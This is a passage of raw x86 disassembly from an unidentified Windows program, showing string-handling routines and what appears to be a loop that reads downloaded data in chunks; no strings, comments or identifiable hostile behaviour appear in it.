  4096fd:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  409700:	73 1a                	jae    0x40971c
  409702:	8b 5d 08             	mov    0x8(%ebp),%ebx
  409705:	03 ff                	add    %edi,%edi
  409707:	57                   	push   %edi
  409708:	56                   	push   %esi
  409709:	53                   	push   %ebx
  40970a:	e8 c1 2e 00 00       	call   0x40c5d0
  40970f:	83 c4 0c             	add    $0xc,%esp
  409712:	66 83 24 1f 00       	andw   $0x0,(%edi,%ebx,1)
  409717:	8d 04 37             	lea    (%edi,%esi,1),%eax
  40971a:	eb 02                	jmp    0x40971e
  40971c:	33 c0                	xor    %eax,%eax
  40971e:	5f                   	pop    %edi
  40971f:	5e                   	pop    %esi
  409720:	5b                   	pop    %ebx
  409721:	5d                   	pop    %ebp
  409722:	c3                   	ret
  409723:	55                   	push   %ebp
  409724:	8b ec                	mov    %esp,%ebp
  409726:	8b 45 0c             	mov    0xc(%ebp),%eax
  409729:	56                   	push   %esi
  40972a:	57                   	push   %edi
  40972b:	ff 75 10             	push   0x10(%ebp)
  40972e:	e8 60 bd ff ff       	call   0x405493
  409733:	ff 75 14             	push   0x14(%ebp)
  409736:	8b f0                	mov    %eax,%esi
  409738:	8b 45 0c             	mov    0xc(%ebp),%eax
  40973b:	e8 53 bd ff ff       	call   0x405493
  409740:	85 f6                	test   %esi,%esi
  409742:	59                   	pop    %ecx
  409743:	59                   	pop    %ecx
  409744:	8b f8                	mov    %eax,%edi
  409746:	74 3f                	je     0x409787
  409748:	85 ff                	test   %edi,%edi
  40974a:	74 3b                	je     0x409787
  40974c:	ff 75 10             	push   0x10(%ebp)
  40974f:	e8 fd bc ff ff       	call   0x405451
  409754:	59                   	pop    %ecx
  409755:	8d 0c 46             	lea    (%esi,%eax,2),%ecx
  409758:	3b f9                	cmp    %ecx,%edi
  40975a:	72 2b                	jb     0x409787
  40975c:	8b c7                	mov    %edi,%eax
  40975e:	2b c1                	sub    %ecx,%eax
  409760:	d1 f8                	sar    $1,%eax
  409762:	3b 45 08             	cmp    0x8(%ebp),%eax
  409765:	73 20                	jae    0x409787
  409767:	8d 34 00             	lea    (%eax,%eax,1),%esi
  40976a:	56                   	push   %esi
  40976b:	51                   	push   %ecx
  40976c:	53                   	push   %ebx
  40976d:	e8 5e 2e 00 00       	call   0x40c5d0
  409772:	ff 75 14             	push   0x14(%ebp)
  409775:	66 83 24 1e 00       	andw   $0x0,(%esi,%ebx,1)
  40977a:	e8 d2 bc ff ff       	call   0x405451
  40977f:	83 c4 10             	add    $0x10,%esp
  409782:	8d 04 47             	lea    (%edi,%eax,2),%eax
  409785:	eb 02                	jmp    0x409789
  409787:	33 c0                	xor    %eax,%eax
  409789:	5f                   	pop    %edi
  40978a:	5e                   	pop    %esi
  40978b:	5d                   	pop    %ebp
  40978c:	c3                   	ret
  40978d:	55                   	push   %ebp
  40978e:	8b ec                	mov    %esp,%ebp
  409790:	b8 00 18 00 00       	mov    $0x1800,%eax
  409795:	e8 16 3e 00 00       	call   0x40d5b0
  40979a:	68 a0 ef 40 00       	push   $0x40efa0
  40979f:	ff 75 08             	push   0x8(%ebp)
  4097a2:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  4097a8:	68 00 08 00 00       	push   $0x800
  4097ad:	50                   	push   %eax
  4097ae:	e8 a2 fe ff ff       	call   0x409655
  4097b3:	83 c4 10             	add    $0x10,%esp
  4097b6:	85 c0                	test   %eax,%eax
  4097b8:	75 02                	jne    0x4097bc
  4097ba:	c9                   	leave
  4097bb:	c3                   	ret
  4097bc:	57                   	push   %edi
  4097bd:	68 ac ef 40 00       	push   $0x40efac
  4097c2:	ff 75 08             	push   0x8(%ebp)
  4097c5:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  4097cb:	68 00 04 00 00       	push   $0x400
  4097d0:	50                   	push   %eax
  4097d1:	e8 7f fe ff ff       	call   0x409655
  4097d6:	8b f8                	mov    %eax,%edi
  4097d8:	83 c4 10             	add    $0x10,%esp
  4097db:	85 ff                	test   %edi,%edi
  4097dd:	74 26                	je     0x409805
  4097df:	56                   	push   %esi
  4097e0:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  4097e6:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  4097ec:	50                   	push   %eax
  4097ed:	ff d6                	call   *%esi
  4097ef:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4097f2:	89 01                	mov    %eax,(%ecx)
  4097f4:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  4097fa:	50                   	push   %eax
  4097fb:	ff d6                	call   *%esi
  4097fd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409800:	89 01                	mov    %eax,(%ecx)
  409802:	8b c7                	mov    %edi,%eax
  409804:	5e                   	pop    %esi
  409805:	5f                   	pop    %edi
  409806:	c9                   	leave
  409807:	c3                   	ret
  409808:	55                   	push   %ebp
  409809:	8b ec                	mov    %esp,%ebp
  40980b:	b8 00 18 00 00       	mov    $0x1800,%eax
  409810:	e8 9b 3d 00 00       	call   0x40d5b0
  409815:	68 c0 ef 40 00       	push   $0x40efc0
  40981a:	ff 75 08             	push   0x8(%ebp)
  40981d:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  409823:	68 00 08 00 00       	push   $0x800
  409828:	50                   	push   %eax
  409829:	e8 27 fe ff ff       	call   0x409655
  40982e:	83 c4 10             	add    $0x10,%esp
  409831:	85 c0                	test   %eax,%eax
  409833:	75 02                	jne    0x409837
  409835:	c9                   	leave
  409836:	c3                   	ret
  409837:	57                   	push   %edi
  409838:	68 d8 ef 40 00       	push   $0x40efd8
  40983d:	ff 75 08             	push   0x8(%ebp)
  409840:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  409846:	68 00 04 00 00       	push   $0x400
  40984b:	50                   	push   %eax
  40984c:	e8 04 fe ff ff       	call   0x409655
  409851:	8b f8                	mov    %eax,%edi
  409853:	83 c4 10             	add    $0x10,%esp
  409856:	85 ff                	test   %edi,%edi
  409858:	74 26                	je     0x409880
  40985a:	56                   	push   %esi
  40985b:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  409861:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  409867:	50                   	push   %eax
  409868:	ff d6                	call   *%esi
  40986a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40986d:	89 01                	mov    %eax,(%ecx)
  40986f:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  409875:	50                   	push   %eax
  409876:	ff d6                	call   *%esi
  409878:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40987b:	89 01                	mov    %eax,(%ecx)
  40987d:	8b c7                	mov    %edi,%eax
  40987f:	5e                   	pop    %esi
  409880:	5f                   	pop    %edi
  409881:	c9                   	leave
  409882:	c3                   	ret
  409883:	55                   	push   %ebp
  409884:	8b ec                	mov    %esp,%ebp
  409886:	b8 00 10 00 00       	mov    $0x1000,%eax
  40988b:	e8 20 3d 00 00       	call   0x40d5b0
  409890:	56                   	push   %esi
  409891:	57                   	push   %edi
  409892:	8b 7d 08             	mov    0x8(%ebp),%edi
  409895:	68 04 f0 40 00       	push   $0x40f004
  40989a:	57                   	push   %edi
  40989b:	be 00 04 00 00       	mov    $0x400,%esi
  4098a0:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4098a6:	56                   	push   %esi
  4098a7:	50                   	push   %eax
  4098a8:	e8 a8 fd ff ff       	call   0x409655
  4098ad:	83 c4 10             	add    $0x10,%esp
  4098b0:	85 c0                	test   %eax,%eax
  4098b2:	74 4f                	je     0x409903
  4098b4:	68 e4 ef 40 00       	push   $0x40efe4
  4098b9:	57                   	push   %edi
  4098ba:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  4098c0:	56                   	push   %esi
  4098c1:	50                   	push   %eax
  4098c2:	e8 8e fd ff ff       	call   0x409655
  4098c7:	8b f8                	mov    %eax,%edi
  4098c9:	83 c4 10             	add    $0x10,%esp
  4098cc:	85 ff                	test   %edi,%edi
  4098ce:	74 33                	je     0x409903
  4098d0:	be 9c f0 40 00       	mov    $0x40f09c,%esi
  4098d5:	8b ce                	mov    %esi,%ecx
  4098d7:	b8 00 22 41 00       	mov    $0x412200,%eax
  4098dc:	e8 0c bc ff ff       	call   0x4054ed
  4098e1:	8d 8d 00 f8 ff ff    	lea    -0x800(%ebp),%ecx
  4098e7:	e8 01 bc ff ff       	call   0x4054ed
  4098ec:	8b ce                	mov    %esi,%ecx
  4098ee:	b8 50 19 41 00       	mov    $0x411950,%eax
  4098f3:	e8 f5 bb ff ff       	call   0x4054ed
  4098f8:	8d 8d 00 f0 ff ff    	lea    -0x1000(%ebp),%ecx
  4098fe:	e8 ea bb ff ff       	call   0x4054ed
  409903:	8b c7                	mov    %edi,%eax
  409905:	5f                   	pop    %edi
  409906:	5e                   	pop    %esi
  409907:	c9                   	leave
  409908:	c3                   	ret
  409909:	55                   	push   %ebp
  40990a:	8b ec                	mov    %esp,%ebp
  40990c:	b8 00 18 00 00       	mov    $0x1800,%eax
  409911:	e8 9a 3c 00 00       	call   0x40d5b0
  409916:	53                   	push   %ebx
  409917:	68 4c f0 40 00       	push   $0x40f04c
  40991c:	68 40 f0 40 00       	push   $0x40f040
  409921:	ff 75 08             	push   0x8(%ebp)
  409924:	8d 9d 00 f8 ff ff    	lea    -0x800(%ebp),%ebx
  40992a:	68 00 08 00 00       	push   $0x800
  40992f:	e8 ef fd ff ff       	call   0x409723
  409934:	83 c4 10             	add    $0x10,%esp
  409937:	85 c0                	test   %eax,%eax
  409939:	0f 84 c5 00 00 00    	je     0x409a04
  40993f:	56                   	push   %esi
  409940:	57                   	push   %edi
  409941:	68 cc e9 40 00       	push   $0x40e9cc
  409946:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40994c:	e8 42 bb ff ff       	call   0x405493
  409951:	8b d8                	mov    %eax,%ebx
  409953:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  409959:	3b d8                	cmp    %eax,%ebx
  40995b:	59                   	pop    %ecx
  40995c:	74 47                	je     0x4099a5
  40995e:	33 ff                	xor    %edi,%edi
  409960:	eb 30                	jmp    0x409992
  409962:	81 ff 00 08 00 00    	cmp    $0x800,%edi
  409968:	7d 30                	jge    0x40999a
  40996a:	66 83 fe 22          	cmp    $0x22,%si
  40996e:	74 2a                	je     0x40999a
  409970:	66 83 fe 3c          	cmp    $0x3c,%si
  409974:	74 24                	je     0x40999a
  409976:	66 83 fe 5d          	cmp    $0x5d,%si
  40997a:	74 1e                	je     0x40999a
  40997c:	8b c6                	mov    %esi,%eax
  40997e:	e8 38 bc ff ff       	call   0x4055bb
  409983:	85 c0                	test   %eax,%eax
  409985:	75 13                	jne    0x40999a
  409987:	43                   	inc    %ebx
  409988:	66 89 b4 7d 00 e8 ff 	mov    %si,-0x1800(%ebp,%edi,2)
  40998f:	ff 
  409990:	43                   	inc    %ebx
  409991:	47                   	inc    %edi
  409992:	0f b7 33             	movzwl (%ebx),%esi
  409995:	66 85 f6             	test   %si,%si
  409998:	75 c8                	jne    0x409962
  40999a:	66 83 a4 7d 00 e8 ff 	andw   $0x0,-0x1800(%ebp,%edi,2)
  4099a1:	ff 00 
  4099a3:	eb 13                	jmp    0x4099b8
  4099a5:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  4099ab:	50                   	push   %eax
  4099ac:	8d 95 00 f8 ff ff    	lea    -0x800(%ebp),%edx
  4099b2:	e8 5a bb ff ff       	call   0x405511
  4099b7:	59                   	pop    %ecx
  4099b8:	68 2c f0 40 00       	push   $0x40f02c
  4099bd:	68 18 f0 40 00       	push   $0x40f018
  4099c2:	ff 75 08             	push   0x8(%ebp)
  4099c5:	8d 9d 00 f8 ff ff    	lea    -0x800(%ebp),%ebx
  4099cb:	68 00 04 00 00       	push   $0x400
  4099d0:	e8 4e fd ff ff       	call   0x409723
  4099d5:	8b f8                	mov    %eax,%edi
  4099d7:	83 c4 10             	add    $0x10,%esp
  4099da:	85 ff                	test   %edi,%edi
  4099dc:	74 24                	je     0x409a02
  4099de:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  4099e4:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  4099ea:	50                   	push   %eax
  4099eb:	ff d6                	call   *%esi
  4099ed:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4099f0:	89 01                	mov    %eax,(%ecx)
  4099f2:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  4099f8:	50                   	push   %eax
  4099f9:	ff d6                	call   *%esi
  4099fb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4099fe:	89 01                	mov    %eax,(%ecx)
  409a00:	8b c7                	mov    %edi,%eax
  409a02:	5f                   	pop    %edi
  409a03:	5e                   	pop    %esi
  409a04:	5b                   	pop    %ebx
  409a05:	c9                   	leave
  409a06:	c3                   	ret
  409a07:	55                   	push   %ebp
  409a08:	8b ec                	mov    %esp,%ebp
  409a0a:	b8 00 10 00 00       	mov    $0x1000,%eax
  409a0f:	e8 9c 3b 00 00       	call   0x40d5b0
  409a14:	8b 45 08             	mov    0x8(%ebp),%eax
  409a17:	53                   	push   %ebx
  409a18:	56                   	push   %esi
  409a19:	57                   	push   %edi
  409a1a:	68 cc e9 40 00       	push   $0x40e9cc
  409a1f:	e8 6f ba ff ff       	call   0x405493
  409a24:	8b f8                	mov    %eax,%edi
  409a26:	33 db                	xor    %ebx,%ebx
  409a28:	85 ff                	test   %edi,%edi
  409a2a:	59                   	pop    %ecx
  409a2b:	74 65                	je     0x409a92
  409a2d:	0f b7 37             	movzwl (%edi),%esi
  409a30:	66 85 f6             	test   %si,%si
  409a33:	74 5d                	je     0x409a92
  409a35:	81 fb ff 07 00 00    	cmp    $0x7ff,%ebx
  409a3b:	7d 30                	jge    0x409a6d
  409a3d:	66 83 fe 22          	cmp    $0x22,%si
  409a41:	74 2a                	je     0x409a6d
  409a43:	66 83 fe 3c          	cmp    $0x3c,%si
  409a47:	74 24                	je     0x409a6d
  409a49:	66 83 fe 5d          	cmp    $0x5d,%si
  409a4d:	74 1e                	je     0x409a6d
  409a4f:	8b c6                	mov    %esi,%eax
  409a51:	e8 65 bb ff ff       	call   0x4055bb
  409a56:	85 c0                	test   %eax,%eax
  409a58:	75 13                	jne    0x409a6d
  409a5a:	47                   	inc    %edi
  409a5b:	47                   	inc    %edi
  409a5c:	66 89 b4 5d 00 f0 ff 	mov    %si,-0x1000(%ebp,%ebx,2)
  409a63:	ff 
  409a64:	0f b7 37             	movzwl (%edi),%esi
  409a67:	43                   	inc    %ebx
  409a68:	66 85 f6             	test   %si,%si
  409a6b:	75 c8                	jne    0x409a35
  409a6d:	66 83 a4 5d 00 f0 ff 	andw   $0x0,-0x1000(%ebp,%ebx,2)
  409a74:	ff 00 
  409a76:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  409a7c:	50                   	push   %eax
  409a7d:	ff 15 08 e1 40 00    	call   *0x40e108
  409a83:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409a86:	89 01                	mov    %eax,(%ecx)
  409a88:	8b 45 10             	mov    0x10(%ebp),%eax
  409a8b:	83 20 00             	andl   $0x0,(%eax)
  409a8e:	8b c7                	mov    %edi,%eax
  409a90:	eb 02                	jmp    0x409a94
  409a92:	33 c0                	xor    %eax,%eax
  409a94:	5f                   	pop    %edi
  409a95:	5e                   	pop    %esi
  409a96:	5b                   	pop    %ebx
  409a97:	c9                   	leave
  409a98:	c3                   	ret
  409a99:	55                   	push   %ebp
  409a9a:	8b ec                	mov    %esp,%ebp
  409a9c:	b8 00 18 00 00       	mov    $0x1800,%eax
  409aa1:	e8 0a 3b 00 00       	call   0x40d5b0
  409aa6:	53                   	push   %ebx
  409aa7:	68 6c f0 40 00       	push   $0x40f06c
  409aac:	68 5c f0 40 00       	push   $0x40f05c
  409ab1:	ff 75 08             	push   0x8(%ebp)
  409ab4:	8d 9d 00 e8 ff ff    	lea    -0x1800(%ebp),%ebx
  409aba:	68 00 08 00 00       	push   $0x800
  409abf:	e8 5f fc ff ff       	call   0x409723
  409ac4:	83 c4 10             	add    $0x10,%esp
  409ac7:	85 c0                	test   %eax,%eax
  409ac9:	74 4e                	je     0x409b19
  409acb:	57                   	push   %edi
  409acc:	68 4c f0 40 00       	push   $0x40f04c
  409ad1:	68 40 f0 40 00       	push   $0x40f040
  409ad6:	ff 75 08             	push   0x8(%ebp)
  409ad9:	8d 9d 00 f8 ff ff    	lea    -0x800(%ebp),%ebx
  409adf:	68 00 04 00 00       	push   $0x400
  409ae4:	e8 3a fc ff ff       	call   0x409723
  409ae9:	8b f8                	mov    %eax,%edi
  409aeb:	83 c4 10             	add    $0x10,%esp
  409aee:	85 ff                	test   %edi,%edi
  409af0:	74 26                	je     0x409b18
  409af2:	56                   	push   %esi
  409af3:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  409af9:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  409aff:	50                   	push   %eax
  409b00:	ff d6                	call   *%esi
  409b02:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409b05:	89 01                	mov    %eax,(%ecx)
  409b07:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  409b0d:	50                   	push   %eax
  409b0e:	ff d6                	call   *%esi
  409b10:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409b13:	89 01                	mov    %eax,(%ecx)
  409b15:	8b c7                	mov    %edi,%eax
  409b17:	5e                   	pop    %esi
  409b18:	5f                   	pop    %edi
  409b19:	5b                   	pop    %ebx
  409b1a:	c9                   	leave
  409b1b:	c3                   	ret
  409b1c:	8b 44 24 04          	mov    0x4(%esp),%eax
  409b20:	68 80 f0 40 00       	push   $0x40f080
  409b25:	e8 69 b9 ff ff       	call   0x405493
  409b2a:	85 c0                	test   %eax,%eax
  409b2c:	59                   	pop    %ecx
  409b2d:	75 01                	jne    0x409b30
  409b2f:	c3                   	ret
  409b30:	ff 74 24 08          	push   0x8(%esp)
  409b34:	e8 b8 00 00 00       	call   0x409bf1
  409b39:	f7 d8                	neg    %eax
  409b3b:	1b c0                	sbb    %eax,%eax
  409b3d:	59                   	pop    %ecx
  409b3e:	f7 d8                	neg    %eax
  409b40:	c3                   	ret
  409b41:	0f b7 05 b0 3e 42 00 	movzwl 0x423eb0,%eax
  409b48:	50                   	push   %eax
  409b49:	ff 35 10 3a 42 00    	push   0x423a10
  409b4f:	68 50 a4 41 00       	push   $0x41a450
  409b54:	ff 74 24 10          	push   0x10(%esp)
  409b58:	e8 b9 fa ff ff       	call   0x409616
  409b5d:	83 c4 10             	add    $0x10,%esp
  409b60:	85 c0                	test   %eax,%eax
  409b62:	75 01                	jne    0x409b65
  409b64:	c3                   	ret
  409b65:	ff 74 24 08          	push   0x8(%esp)
  409b69:	e8 83 00 00 00       	call   0x409bf1
  409b6e:	f7 d8                	neg    %eax
  409b70:	1b c0                	sbb    %eax,%eax
  409b72:	59                   	pop    %ecx
  409b73:	f7 d8                	neg    %eax
  409b75:	c3                   	ret
  409b76:	0f b7 05 ac 3e 42 00 	movzwl 0x423eac,%eax
  409b7d:	50                   	push   %eax
  409b7e:	ff 35 e4 50 41 00    	push   0x4150e4
  409b84:	68 80 3d 42 00       	push   $0x423d80
  409b89:	ff 74 24 10          	push   0x10(%esp)
  409b8d:	e8 84 fa ff ff       	call   0x409616
  409b92:	83 c4 10             	add    $0x10,%esp
  409b95:	85 c0                	test   %eax,%eax
  409b97:	75 01                	jne    0x409b9a
  409b99:	c3                   	ret
  409b9a:	ff 74 24 08          	push   0x8(%esp)
  409b9e:	e8 4e 00 00 00       	call   0x409bf1
  409ba3:	f7 d8                	neg    %eax
  409ba5:	1b c0                	sbb    %eax,%eax
  409ba7:	59                   	pop    %ecx
  409ba8:	f7 d8                	neg    %eax
  409baa:	c3                   	ret
  409bab:	0f b7 05 b4 3e 42 00 	movzwl 0x423eb4,%eax
  409bb2:	50                   	push   %eax
  409bb3:	ff 35 e4 39 42 00    	push   0x4239e4
  409bb9:	68 00 3e 42 00       	push   $0x423e00
  409bbe:	ff 74 24 10          	push   0x10(%esp)
  409bc2:	e8 4f fa ff ff       	call   0x409616
  409bc7:	83 c4 10             	add    $0x10,%esp
  409bca:	c3                   	ret
  409bcb:	ff 35 a0 a4 41 00    	push   0x41a4a0
  409bd1:	8b 44 24 08          	mov    0x8(%esp),%eax
  409bd5:	e8 b9 b8 ff ff       	call   0x405493
  409bda:	85 c0                	test   %eax,%eax
  409bdc:	59                   	pop    %ecx
  409bdd:	75 01                	jne    0x409be0
  409bdf:	c3                   	ret
  409be0:	ff 74 24 08          	push   0x8(%esp)
  409be4:	e8 08 00 00 00       	call   0x409bf1
  409be9:	f7 d8                	neg    %eax
  409beb:	1b c0                	sbb    %eax,%eax
  409bed:	59                   	pop    %ecx
  409bee:	f7 d8                	neg    %eax
  409bf0:	c3                   	ret
  409bf1:	56                   	push   %esi
  409bf2:	57                   	push   %edi
  409bf3:	8b 3d fc 21 41 00    	mov    0x4121fc,%edi
  409bf9:	33 f6                	xor    %esi,%esi
  409bfb:	85 ff                	test   %edi,%edi
  409bfd:	7e 1a                	jle    0x409c19
  409bff:	ff 34 b5 a8 21 41 00 	push   0x4121a8(,%esi,4)
  409c06:	8b 44 24 10          	mov    0x10(%esp),%eax
  409c0a:	e8 84 b8 ff ff       	call   0x405493
  409c0f:	85 c0                	test   %eax,%eax
  409c11:	59                   	pop    %ecx
  409c12:	75 31                	jne    0x409c45
  409c14:	46                   	inc    %esi
  409c15:	3b f7                	cmp    %edi,%esi
  409c17:	7c e6                	jl     0x409bff
  409c19:	8b 3d d4 f5 41 00    	mov    0x41f5d4,%edi
  409c1f:	33 f6                	xor    %esi,%esi
  409c21:	85 ff                	test   %edi,%edi
  409c23:	7e 1a                	jle    0x409c3f
  409c25:	ff 34 b5 e8 4c 41 00 	push   0x414ce8(,%esi,4)
  409c2c:	8b 44 24 10          	mov    0x10(%esp),%eax
  409c30:	e8 5e b8 ff ff       	call   0x405493
  409c35:	85 c0                	test   %eax,%eax
  409c37:	59                   	pop    %ecx
  409c38:	75 0b                	jne    0x409c45
  409c3a:	46                   	inc    %esi
  409c3b:	3b f7                	cmp    %edi,%esi
  409c3d:	7c e6                	jl     0x409c25
  409c3f:	33 c0                	xor    %eax,%eax
  409c41:	40                   	inc    %eax
  409c42:	5f                   	pop    %edi
  409c43:	5e                   	pop    %esi
  409c44:	c3                   	ret
  409c45:	33 c0                	xor    %eax,%eax
  409c47:	eb f9                	jmp    0x409c42
  409c49:	8b 04 85 58 21 41 00 	mov    0x412158(,%eax,4),%eax
  409c50:	85 c0                	test   %eax,%eax
  409c52:	74 1a                	je     0x409c6e
  409c54:	50                   	push   %eax
  409c55:	ff 15 08 e1 40 00    	call   *0x40e108
  409c5b:	8b 0d fc 21 41 00    	mov    0x4121fc,%ecx
  409c61:	ff 05 fc 21 41 00    	incl   0x4121fc
  409c67:	89 04 8d a8 21 41 00 	mov    %eax,0x4121a8(,%ecx,4)
  409c6e:	c3                   	ret
  409c6f:	56                   	push   %esi
  409c70:	33 f6                	xor    %esi,%esi
  409c72:	39 35 fc 21 41 00    	cmp    %esi,0x4121fc
  409c78:	7e 16                	jle    0x409c90
  409c7a:	ff 34 b5 a8 21 41 00 	push   0x4121a8(,%esi,4)
  409c81:	ff 15 00 e1 40 00    	call   *0x40e100
  409c87:	46                   	inc    %esi
  409c88:	3b 35 fc 21 41 00    	cmp    0x4121fc,%esi
  409c8e:	7c ea                	jl     0x409c7a
  409c90:	83 25 fc 21 41 00 00 	andl   $0x0,0x4121fc
  409c97:	5e                   	pop    %esi
  409c98:	c3                   	ret
  409c99:	55                   	push   %ebp
  409c9a:	8b ec                	mov    %esp,%ebp
  409c9c:	b8 10 10 00 00       	mov    $0x1010,%eax
  409ca1:	e8 0a 39 00 00       	call   0x40d5b0
  409ca6:	57                   	push   %edi
  409ca7:	33 ff                	xor    %edi,%edi
  409ca9:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  409cac:	74 0b                	je     0x409cb9
  409cae:	ff 75 0c             	push   0xc(%ebp)
  409cb1:	e8 9b b7 ff ff       	call   0x405451
  409cb6:	59                   	pop    %ecx
  409cb7:	eb 02                	jmp    0x409cbb
  409cb9:	33 c0                	xor    %eax,%eax
  409cbb:	57                   	push   %edi
  409cbc:	68 00 00 40 04       	push   $0x4400000
  409cc1:	50                   	push   %eax
  409cc2:	ff 75 0c             	push   0xc(%ebp)
  409cc5:	ff 75 08             	push   0x8(%ebp)
  409cc8:	ff 75 10             	push   0x10(%ebp)
  409ccb:	ff 15 80 e1 40 00    	call   *0x40e180
  409cd1:	3b c7                	cmp    %edi,%eax
  409cd3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409cd6:	75 07                	jne    0x409cdf
  409cd8:	33 c0                	xor    %eax,%eax
  409cda:	e9 12 01 00 00       	jmp    0x409df1
  409cdf:	53                   	push   %ebx
  409ce0:	8b 1d d0 e0 40 00    	mov    0x40e0d0,%ebx
  409ce6:	b8 01 20 00 00       	mov    $0x2001,%eax
  409ceb:	56                   	push   %esi
  409cec:	50                   	push   %eax
  409ced:	57                   	push   %edi
  409cee:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409cf1:	89 45 0c             	mov    %eax,0xc(%ebp)
  409cf4:	ff d3                	call   *%ebx
  409cf6:	50                   	push   %eax
  409cf7:	ff 15 94 e0 40 00    	call   *0x40e094
  409cfd:	8b f0                	mov    %eax,%esi
  409cff:	80 3e 00             	cmpb   $0x0,(%esi)
  409d02:	75 57                	jne    0x409d5b
  409d04:	33 c0                	xor    %eax,%eax
  409d06:	e9 e4 00 00 00       	jmp    0x409def
  409d0b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409d0e:	85 c0                	test   %eax,%eax
  409d10:	74 67                	je     0x409d79
  409d12:	39 45 0c             	cmp    %eax,0xc(%ebp)
  409d15:	c6 84 05 f0 ef ff ff 	movb   $0x0,-0x1010(%ebp,%eax,1)
  409d1c:	00 
  409d1d:	77 1e                	ja     0x409d3d
  409d1f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409d22:	01 45 0c             	add    %eax,0xc(%ebp)
  409d25:	03 c0                	add    %eax,%eax
  409d27:	50                   	push   %eax
  409d28:	56                   	push   %esi
  409d29:	6a 00                	push   $0x0
  409d2b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409d2e:	ff d3                	call   *%ebx
  409d30:	50                   	push   %eax
  409d31:	ff 15 30 e0 40 00    	call   *0x40e030
  409d37:	8b f0                	mov    %eax,%esi
  409d39:	85 f6                	test   %esi,%esi
  409d3b:	74 c7                	je     0x409d04
  409d3d:	ff 75 f8             	push   -0x8(%ebp)
  409d40:	8d 85 f0 ef ff ff    	lea    -0x1010(%ebp),%eax
  409d46:	50                   	push   %eax
  409d47:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  409d4a:	50                   	push   %eax
  409d4b:	e8 80 28 00 00       	call   0x40c5d0
  409d50:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409d53:	29 45 0c             	sub    %eax,0xc(%ebp)
  409d56:	83 c4 0c             	add    $0xc,%esp
  409d59:	03 f8                	add    %eax,%edi
  409d5b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409d5e:	50                   	push   %eax
  409d5f:	68 00 10 00 00       	push   $0x1000
  409d64:	8d 85 f0 ef ff ff    	lea    -0x1010(%ebp),%eax
  409d6a:	50                   	push   %eax
  409d6b:	ff 75 fc             	push   -0x4(%ebp)
  409d6e:	ff 15 8c e1 40 00    	call   *0x40e18c
  409d74:	83 f8 01             	cmp    $0x1,%eax
  409d77:	74 92                	je     0x409d0b
  409d79:	8d 44 3f 02          	lea    0x2(%edi,%edi,1),%eax
  409d7d:	50                   	push   %eax
  409d7e:	6a 00                	push   $0x0
  409d80:	ff d3                	call   *%ebx
  409d82:	50                   	push   %eax
  409d83:	ff 15 94 e0 40 00    	call   *0x40e094
  409d89:	85 c0                	test   %eax,%eax
  409d8b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  409d8e:	89 01                	mov    %eax,(%ecx)
  409d90:	75 05                	jne    0x409d97
  409d92:	21 45 fc             	and    %eax,-0x4(%ebp)
  409d95:	eb 49                	jmp    0x409de0
  409d97:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  409d9b:	85 f6                	test   %esi,%esi
  409d9d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409da4:	c6 04 3e 00          	movb   $0x0,(%esi,%edi,1)
  409da8:	8b c8                	mov    %eax,%ecx
  409daa:	74 2a                	je     0x409dd6
  409dac:	85 ff                	test   %edi,%edi
  409dae:	76 26                	jbe    0x409dd6
  409db0:	66 83 21 00          	andw   $0x0,(%ecx)
  409db4:	85 ff                	test   %edi,%edi
  409db6:	76 1e                	jbe    0x409dd6
  409db8:	8b 55 0c             	mov    0xc(%ebp),%edx
  409dbb:	66 0f b6 14 32       	movzbw (%edx,%esi,1),%dx
  409dc0:	66 89 11             	mov    %dx,(%ecx)
  409dc3:	8b 55 0c             	mov    0xc(%ebp),%edx
  409dc6:	80 3c 32 00          	cmpb   $0x0,(%edx,%esi,1)
  409dca:	74 0a                	je     0x409dd6
  409dcc:	ff 45 0c             	incl   0xc(%ebp)
  409dcf:	41                   	inc    %ecx
  409dd0:	41                   	inc    %ecx
  409dd1:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  409dd4:	72 e2                	jb     0x409db8
